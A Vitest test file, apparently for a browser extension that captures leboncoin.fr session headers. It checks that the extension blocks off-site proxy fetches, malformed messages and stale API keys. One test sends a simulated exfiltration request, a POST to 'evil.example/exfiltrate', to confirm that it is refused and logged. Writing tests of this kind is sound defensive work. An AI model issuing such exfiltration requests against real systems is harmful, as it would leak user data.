// Tier 4 — INTEGRATION: session-capture adversarial security paths.
// Covers blocked proxy abuse, malformed message envelopes, and stale-capture replay resistance.

import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

const ORIGINAL_GLOBALS = {
  window: globalThis.window,
  document: globalThis.document,
  location: globalThis.location,
  localStorage: globalThis.localStorage,
  navigator: globalThis.navigator,
  fetch: globalThis.fetch,
};

function createLocalStorage(initial = {}) {
  const state = new Map(Object.entries(initial));
  return {
    getItem(key) {
      return state.has(key) ? state.get(key) : null;
    },
    setItem(key, value) {
      state.set(key, String(value));
    },
    removeItem(key) {
      state.delete(key);
    },
    clear() {
      state.clear();
    },
  };
}

function installDomGlobals(initialCapture) {
  const listeners = new Map();
  const location = new URL("https://www.leboncoin.fr/");

  const localStorage = createLocalStorage(initialCapture ? { __lbch_capture__: JSON.stringify(initialCapture) } : {});

  const windowMock = {
    location,
    addEventListener(type, fn) {
      const arr = listeners.get(type) || [];
      arr.push(fn);
      listeners.set(type, arr);
    },
    removeEventListener(type, fn) {
      const arr = listeners.get(type) || [];
      listeners.set(
        type,
        arr.filter((cb) => cb !== fn),
      );
    },
    postMessage(data, _origin) {
      const arr = listeners.get("message") || [];
      for (const cb of arr) cb({ source: windowMock, data });
    },
  };

  Object.defineProperty(globalThis, "window", {
    value: windowMock,
    configurable: true,
    writable: true,
  });
  Object.defineProperty(globalThis, "document", {
    value: {
      getElementById: () => null,
    },
    configurable: true,
    writable: true,
  });
  Object.defineProperty(globalThis, "location", {
    value: location,
    configurable: true,
    writable: true,
  });
  Object.defineProperty(globalThis, "localStorage", {
    value: localStorage,
    configurable: true,
    writable: true,
  });
  Object.defineProperty(globalThis, "navigator", {
    value: { userAgent: "Vitest-UA/1.0" },
    configurable: true,
    writable: true,
  });

  return { localStorage };
}

async function loadSessionCapture({ capture, fetchImpl } = {}) {
  installDomGlobals(capture);
  globalThis.fetch =
    fetchImpl ||
    vi.fn().mockResolvedValue({
      ok: true,
      json: async () => ({ ads: [] }),
    });

  vi.resetModules();
  await import("@/content/session-capture.js");
}

function restoreGlobals() {
  const names = ["window", "document", "location", "localStorage", "navigator", "fetch"];
  for (const name of names) {
    const original = ORIGINAL_GLOBALS[name];
    if (original === undefined) {
      delete globalThis[name];
      continue;
    }
    Object.defineProperty(globalThis, name, {
      value: original,
      configurable: true,
      writable: true,
    });
  }
}

async function dispatch(msg) {
  return chrome.runtime.__dispatch(msg);
}

describe("session-capture hardening", () => {
  beforeEach(() => {
    vi.restoreAllMocks();
  });

  afterEach(() => {
    restoreGlobals();
  });

  it("rejects non-LBC EXECUTE_FETCH proxy requests and emits blocked_proxy_request", async () => {
    const spy = vi.spyOn(chrome.runtime, "sendMessage");
    const fetchSpy = vi.fn().mockResolvedValue({ ok: true, json: async () => ({}) });

    await loadSessionCapture({
      capture: {
        headers: { api_key: "fresh-key-1234567890" },
        ts: Date.now(),
      },
      fetchImpl: fetchSpy,
    });

    spy.mockClear();
    const r = await dispatch({
      type: "EXECUTE_FETCH",
      url: "https://evil.example/exfiltrate",
      options: {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ q: "x" }),
      },
    });

    expect(r.ok).toBe(false);
    expect(r.error).toBe("blocked_non_lbc_url");
    expect(fetchSpy).not.toHaveBeenCalled();
    expect(spy).toHaveBeenCalledWith(
      expect.objectContaining({
        type: "SECURITY_EVENT",
        event: "blocked_proxy_request",
      }),
    );
  });

  it("rejects malformed message envelopes and emits blocked_message_envelope", async () => {
    const spy = vi.spyOn(chrome.runtime, "sendMessage");

    await loadSessionCapture({
      capture: {
        headers: { api_key: "fresh-key-1234567890" },
        ts: Date.now(),
      },
    });

    spy.mockClear();
    const r = await dispatch("invalid-envelope");

    expect(r.ok).toBe(false);
    expect(r.error).toBe("invalid_message");
    expect(spy).toHaveBeenCalledWith(
      expect.objectContaining({
        type: "SECURITY_EVENT",
        event: "blocked_message_envelope",
      }),
    );
  });

  it("REFRESH_SESSION ignores stale capture keys and falls back to probe path", async () => {
    const spy = vi.spyOn(chrome.runtime, "sendMessage");
    const fetchSpy = vi.fn().mockResolvedValue({
      ok: true,
      json: async () => ({ ads: [] }),
    });

    await loadSessionCapture({
      capture: {
        headers: { api_key: "fresh-key-1234567890" },
        ts: Date.now(),
      },
      fetchImpl: fetchSpy,
    });

    spy.mockClear();
    fetchSpy.mockClear();

    localStorage.setItem(
      "__lbch_capture__",
      JSON.stringify({
        headers: { api_key: "stale-key-1234567890" },
        ts: Date.now() - 2 * 60 * 60 * 1000,
      }),
    );

    const r = await dispatch({ type: "REFRESH_SESSION" });
    expect(r.ok).toBe(true);
    expect(r.method).toBe("probe");

    expect(fetchSpy).toHaveBeenCalled();
    const fetchOptions = fetchSpy.mock.calls[0][1];
    expect(fetchOptions.headers.api_key).toBeUndefined();

    await Promise.resolve();
    await Promise.resolve();

    const sentSessions = spy.mock.calls.map((call) => call[0]).filter((msg) => msg?.type === "SESSION_CAPTURED");

    expect(sentSessions.length).toBeGreaterThan(0);
    expect(sentSessions.every((msg) => msg.apiKey !== "stale-key-1234567890")).toBe(true);
  });
});
